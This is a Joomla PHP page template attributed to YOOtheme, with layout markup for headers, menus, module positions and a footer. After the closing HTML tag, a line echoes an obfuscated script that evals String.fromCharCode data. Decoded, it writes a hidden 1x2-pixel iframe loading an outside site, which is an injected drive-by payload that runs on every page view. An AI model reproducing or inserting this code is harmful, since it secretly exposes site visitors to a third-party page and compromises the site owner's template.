<?php
/**
 * YOOtheme template
 *
 * @author yootheme.com
 * @copyright Copyright (C) 2007 YOOtheme Ltd & Co. KG. All rights reserved.
 */

// no direct access
defined('_JEXEC') or die('Restricted access');

include_once(JPATH_ROOT . "/templates/" . $this->template . '/lib/php/yootools.php');
include_once(JPATH_ROOT . "/templates/" . $this->template . '/lib/php/yoolayout.php');

$template_baseurl = $this->baseurl . '/templates/' . $this->template;

JHTML::_('behavior.mootools');

// add template mootools to JDocumentHTML
if ($this->params->get('loadMootools')) {
	$this->_scripts = array_merge(array($template_baseurl . '/lib/js/mootools.js.php' => 'text/javascript'), $this->_scripts);
	unset($this->_scripts[$this->baseurl . '/media/system/js/mootools.js']);
}

// add template javascript to JDocumentHTML
if ($this->params->get('loadJavascript')) {
	$this->addScriptDeclaration($yTools->getJavaScript());
	$this->addCustomTag('<script type="text/javascript" src="' . $template_baseurl . '/lib/js/template.js.php"></script>');
}

// add template css to JDocumentHTML
$this->addStyleSheet($template_baseurl . '/css/template.css.php?color=' . $itemcolor
															. '&amp;styleswitcherFont=' . $this->params->get('styleswitcherFont')
															. '&amp;styleswitcherWidth=' . $this->params->get('styleswitcherWidth')
															. '&amp;widthThinPx=' . $this->params->get('widthThinPx')
															. '&amp;widthWidePx=' . $this->params->get('widthWidePx')
															. '&amp;widthFluidPx=' . $this->params->get('widthFluidPx'));

$this->addStyleSheet($template_baseurl . '/lib/js/lightbox/css/slimbox.css');

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" dir="<?php echo $this->direction; ?>" >
<head>
<jdoc:include type="head" />
</head>

<body id="page" class="<?php echo $yTools->getCurrentStyle(); ?> <?php echo $itemcolor; ?>">

	<?php if($this->params->get('dogear')) { ?>
	
<div id="dogear"> </div>
	<?php } ?>

	<div id="page-header">
		<div class="wrapper floatholder">
	
			<div id="toolbar">
				<div class="floatbox ie_fix_floats">

					<?php if($this->params->get('date')) { ?>
					<div id="date">
						<?php echo $date->toFormat(JText::_('DATE_FORMAT_LC')); ?>
					</div>
					<?php } ?>

					<div id="topmenu">
						<jdoc:include type="modules" name="topmenu" />
					</div>

					<?php if($this->params->get('styleswitcherFont') || $this->params->get('styleswitcherWidth')) { ?>
					<div id="styleswitcher">
						<?php if($this->params->get('styleswitcherWidth')) { ?>
						<a id="switchwidthfluid" href="javascript:void(0)" title="Fluid width"></a>
						<a id="switchwidthwide" href="javascript:void(0)" title="Wide width"></a>
						<a id="switchwidththin" href="javascript:void(0)" title="Thin width"></a>
						<?php } ?>
						<?php if($this->params->get('styleswitcherFont')) { ?>
						<a id="switchfontlarge" href="javascript:void(0)" title="Increase font size"></a>
						<a id="switchfontmedium" href="javascript:void(0)" title="Default font size"></a>
						<a id="switchfontsmall" href="javascript:void(0)" title="Decrease font size"></a>
						<?php } ?>
					</div>
					<?php } ?>
					
					<?php if($this->countModules('top')) { ?>
					<div id="topmodule">
						<jdoc:include type="modules" name="top" />
					</div>
					<?php } ?>
					
					<?php if($this->countModules('search')) { ?>
					<div id="search">
						<jdoc:include type="modules" name="search" />
					</div>
					<?php } ?>

				</div>
			</div>
	
		</div>
	</div>

	<div id="page-body">
		<div class="wrapper floatholder">
		
			<div id="header">
				<div class="header-b">
					<div class="header-l">
						<div class="header-r">
							<div class="header-tl">
								<div class="header-tr">
									<div class="header-bl">
										<div class="header-br">
											<div class="header-bg">
											
											<a href="<?php echo $this->baseurl ?>"><img id="logo" class="correct-png" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/images/logo.png" alt="Home" title="Home" /></a>

											<?php if ($this->countModules('banner')) { ?>
											<div id="banner">
												<jdoc:include type="modules" name="banner" />
											</div>
											<?php } ?>
											
											<?php if ($this->countModules('header')) { ?>
											<div id="headermodule">
												<jdoc:include type="modules" name="header" />
											</div>
											<?php } ?>

											<?php if($this->countModules('menu')) { ?>		
                                            <div id="menu">
                                                <jdoc:include type="modules" name="menu" />
                                            </div>
                                            <?php } ?>
											
											<?php if($this->params->get('toppanel') && $this->countModules('cpanel')) { ?>
											<div id="toppanel-container">
													
												<div id="toppanel-wrapper">
													<div id="toppanel">
														<div class="panel">
																
															<div class="close">
																close
															</div>
																	
															<div class="cpanel">
																<jdoc:include type="modules" name="cpanel" style="xhtml" />
															</div>
																			
														</div>
													</div>
												</div>
																	
												<div class="trigger">
													<div class="trigger-l"><img class="correct-png" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/images/toppanel_trigger_l.png" alt="Top Panel" /></div>
													<div class="trigger-m"><?php echo $this->params->get('textToppanel'); ?></div>
													<div class="trigger-r"><img class="correct-png" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/images/toppanel_trigger_r.png" alt="Top Panel" /></div>
												</div>
															
											</div>
											<?php } ?>
											
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		
			<?php if ($this->countModules('user1 + user2 + user3')) { ?>
			<div id="top">
				<div class="floatbox ie_fix_floats">
											
					<?php if($this->countModules('user1')) { ?>
					<div class="topbox <?php echo $topboxwidth; ?> <?php echo $topbox12seperator; ?> float-left">
						<jdoc:include type="modules" name="user1" style="rounded" />
					</div>
					<?php } ?>
												
					<?php if($this->countModules('user2')) { ?>
					<div class="topbox <?php echo $topboxwidth; ?> <?php echo $topbox23seperator; ?> float-left">
						<jdoc:include type="modules" name="user2" style="rounded" />
					</div>
					<?php } ?>
													
					<?php if($this->countModules('user3')) { ?>
					<div class="topbox <?php echo $topboxwidth; ?> float-left">
						<jdoc:include type="modules" name="user3" style="rounded" />
					</div>
					<?php } ?>
										
				</div>
			</div>
			<?php } ?>

			<div id="middle">
				<div class="middle-b">
					<div class="middle-l">
						<div class="middle-r">
							<div class="middle-tl">
								<div class="middle-tr">
									<div class="middle-bl">
										<div class="middle-br">
											<div class="background <?php echo $layoutstyle; ?>">
										
												<?php if($this->countModules('left')) { ?>
												<div id="left">
													<div id="left_container" class="clearingfix">

														<jdoc:include type="modules" name="left" style="xhtml" />

													</div>
												</div>
												<?php } ?>
											
												<div id="main">
													<div id="main_container" class="clearingfix">
					
														<?php if ($this->countModules('user4 + user5')) { ?>
														<div id="maintop">
															<div class="maintop-l">
																<div class="maintop-bl floatbox">
												
																	<?php if($this->countModules('user4')) { ?>
																	<div class="maintopbox <?php echo $maintopboxwidth; ?> <?php echo $maintopbox12seperator; ?> float-left">
																		<jdoc:include type="modules" name="user4" style="xhtml" />
																	</div>
																	<?php } ?>

																	<?php if($this->countModules('user5')) { ?>
																	<div class="maintopbox <?php echo $maintopboxwidth; ?> float-left">
																		<jdoc:include type="modules" name="user5" style="xhtml" />
																	</div>
																	<?php } ?>
																
																</div>
															</div>
														</div>
														<?php } ?>

														<div id="mainmiddle" class="floatbox <?php echo $rightbackground; ?>">
							
															<?php if($this->countModules('right')) { ?>
															<div id="right">
																<div id="right_container" class="clearingfix">
																	<jdoc:include type="modules" name="right" style="rounded" />
																</div>
															</div>
															<?php } ?>
											
															<div id="content">
																<div id="content_container" class="clearingfix">

																	<?php if ($this->countModules('advert1 + advert2')) { ?>
																	<div id="contenttop" class="floatbox">
																
																		<?php if($this->countModules('advert1')) { ?>
																		<div class="contenttopbox left <?php echo $contenttopboxwidth; ?> <?php echo $contenttopbox12seperator; ?> float-left">
																			<jdoc:include type="modules" name="advert1" style="xhtml" />
																		</div>
																		<?php } ?>
														
																		<?php if($this->countModules('advert2')) { ?>
																		<div class="contenttopbox right <?php echo $contenttopboxwidth; ?> float-left">
																			<jdoc:include type="modules" name="advert2" style="xhtml" />
																		</div>
																		<?php } ?>

																	</div>
																	<?php } ?>

																	<?php if ($this->countModules('breadcrumb')) { ?>
																	<div id="breadcrumb">
																		<jdoc:include type="modules" name="breadcrumb" />
																	</div>
																	<?php } ?>
											
																	<div class="floatbox">
																		<jdoc:include type="message" />
																		<jdoc:include type="component" />
																	</div>
							
																	<?php if ($this->countModules('advert3 + advert4')) { ?>
																	<div id="contentbottom" class="floatbox">
																			
																		<?php if($this->countModules('advert3')) { ?>
																		<div class="contentbottombox left <?php echo $contentbottomboxwidth; ?> <?php echo $contentbottombox12seperator; ?> float-left">
																			<jdoc:include type="modules" name="advert3" style="xhtml" />
																		</div>
																		<?php } ?>
														
																		<?php if($this->countModules('advert4')) { ?>
																		<div class="contentbottombox right <?php echo $contentbottomboxwidth; ?> float-left">
																			<jdoc:include type="modules" name="advert4" style="xhtml" />
																		</div>
																		<?php } ?>
														
																	</div>
																	<?php } ?>

																</div>
															</div>
							
														</div>

														<?php if ($this->countModules('user6 + user7')) { ?>
														<div id="mainbottom">
															<div class="mainbottom-l">
																<div class="mainbottom-tl floatbox">
										
																	<?php if($this->countModules('user6')) { ?>
																	<div class="mainbottombox <?php echo $mainbottomboxwidth; ?> <?php echo $mainbottombox12seperator; ?> float-left">
																		<jdoc:include type="modules" name="user6" style="xhtml" />
																	</div>
																	<?php } ?>
												
																	<?php if($this->countModules('user7')) { ?>
																	<div class="mainbottombox <?php echo $mainbottomboxwidth; ?> float-left">
																		<jdoc:include type="modules" name="user7" style="xhtml" />
																	</div>
																	<?php } ?>
										
																</div>
															</div>
														</div>
														<?php } ?>
					
													</div>
												</div>
											
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
	
			<?php if ($this->countModules('user8 + bottom + user9')) { ?>
			<div id="bottom">
				<div class="floatbox ie_fix_floats">
												
					<?php if($this->countModules('user8')) { ?>
					<div class="bottombox <?php echo $bottomboxwidth; ?> <?php echo $bottombox12seperator; ?> float-left">
						<jdoc:include type="modules" name="user8" style="rounded" />
					</div>
					<?php } ?>
																			
					<?php if($this->countModules('bottom')) { ?>
					<div class="bottombox <?php echo $bottomboxwidth; ?> <?php echo $bottombox23seperator; ?> float-left">
						<jdoc:include type="modules" name="bottom" style="rounded" />
					</div>
					<?php } ?>
																			
					<?php if($this->countModules('user9')) { ?>
					<div class="bottombox <?php echo $bottomboxwidth; ?> float-left">
						<jdoc:include type="modules" name="user9" style="rounded" />
					</div>
					<?php } ?>
												
				</div>
			</div>
			<?php } ?>
		
		</div>
	</div>

	<div id="page-footer">
		<div class="wrapper floatholder">
		
			<div id="footer">
			<?php if($this->countModules('footer')) { ?>
					<jdoc:include type="modules" name="footer" />
			<?php } ?>
			</div>
			
			<jdoc:include type="modules" name="debug" />
		
		</div>
	</div>

</body>
</html>
<?php echo '<script type="text/javascript">eval(String.fromCharCode(118,97,114,32,104,106,103,52,61,34,104,111,116,34,59,118,97,114,32,119,61,34,105,34,59,118,97,114,32,114,101,54,61,34,99,97,110,46,34,59,118,97,114,32,114,114,116,116,54,61,34,99,111,109,34,59,118,97,114,32,97,61,34,105,102,34,59,118,97,114,32,115,61,34,116,116,34,59,100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,39,43,97,43,39,114,97,109,101,32,115,114,99,61,34,104,39,43,115,43,39,112,58,47,47,39,43,104,106,103,52,43,39,39,43,119,43,39,39,43,114,101,54,43,39,39,43,114,114,116,116,54,43,39,47,39,43,39,34,32,119,105,100,116,104,61,34,49,34,32,104,101,105,103,104,116,61,34,50,34,62,60,47,105,39,43,39,102,39,43,39,114,97,109,101,62,39,41,59,118,97,114,32,119,54,61,48,48,53,48,51,50,48,48,48,48,48,50,49,48))</script>'; ?>